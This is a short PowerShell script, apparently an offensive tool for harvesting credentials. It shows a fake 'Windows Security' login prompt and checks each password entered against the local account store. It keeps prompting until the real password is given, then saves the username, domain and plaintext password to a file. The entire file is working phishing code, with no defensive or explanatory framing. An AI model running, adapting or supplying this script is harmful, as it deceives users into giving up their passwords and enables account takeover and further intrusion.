param([string]$username)
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$username","")
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full", "$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$username","")
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null -ErrorAction SilentlyContinue 
    }
$output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
$output | Out-File -FilePath "output.txt"
